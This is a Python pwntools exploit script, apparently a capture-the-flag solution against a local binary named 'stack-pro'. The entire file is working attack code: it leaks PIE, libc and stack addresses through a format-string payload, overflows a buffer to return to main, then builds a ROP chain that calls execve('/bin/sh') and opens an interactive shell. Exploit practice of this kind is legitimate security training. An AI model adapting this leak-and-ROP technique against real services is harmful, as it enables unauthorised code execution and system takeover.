from pwn import *

elf = context.binary = ELF('./stack-pro', checksec = False)
libc = ELF('./libc.so.6', checksec = False)
# p = elf.process()
p = remote('localhost', 4094)
# gdb.attach(p, '''
# init-pwndbg
# b *vuln
# fini
# fini
# fini
# fini    
# ''')


vuln = eval(p.recvline().split(b' ')[-1].decode())

elf.address = vuln - elf.sym['vuln']

log.critical(f"elf @ {hex(elf.address)}")

p.sendline(b"%3$p %13$p " + cyclic(29) + p64(elf.sym['main'] + 36))

p.recvline()
libc_leak, stack_leak = p.recvline().split(b' ')[:2]
libc_leak = eval(libc_leak.decode())
stack_leak = eval(stack_leak.decode())

libc.address = libc_leak - libc.sym['_IO_2_1_stdin_']

log.critical(f"Libc @ {hex(libc.address)}")
log.critical(f"stack leak : {hex(stack_leak)}")

pop_rdi = p64(libc.address + 0x000000000002a3e5)
pop_rsi = p64(libc.address + 0x000000000002be51)
pop_rdx = p64(libc.address + 0x000000000011f2e7)
ret = p64(libc.address + 0x0000000000029139)

p.sendline(cyclic(40) + ret + pop_rdi + p64(next(libc.search(b'/bin/sh'))) + pop_rsi + p64(0) + pop_rdx + p64(0) + p64(0) + p64(libc.sym['execve'])) 

p.interactive()